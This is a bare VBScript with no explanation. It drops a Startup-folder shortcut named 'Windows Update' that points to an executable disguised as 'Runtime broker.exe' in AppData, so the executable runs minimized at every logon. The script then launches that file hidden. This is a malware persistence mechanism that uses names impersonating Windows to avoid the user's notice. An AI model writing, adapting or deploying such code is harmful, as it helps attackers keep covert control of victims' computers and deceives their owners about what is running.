Set objShell = CreateObject("WScript.Shell")
strStartupFolder = objShell.SpecialFolders("Startup")
strTargetPath = objShell.ExpandEnvironmentStrings("%APPDATA%\SubDir\Runtime broker.exe")
strShortcutPath = strStartupFolder & "\Windows Update.lnk"

Set objShortcut = objShell.CreateShortcut(strShortcutPath)
objShortcut.TargetPath = strTargetPath
objShortcut.WorkingDirectory = objShell.ExpandEnvironmentStrings("%APPDATA%\SubDir")
objShortcut.WindowStyle = 7
objShortcut.Description = "Windows Update"
objShortcut.Save

objShell.Run """" & strTargetPath & """", 0, False
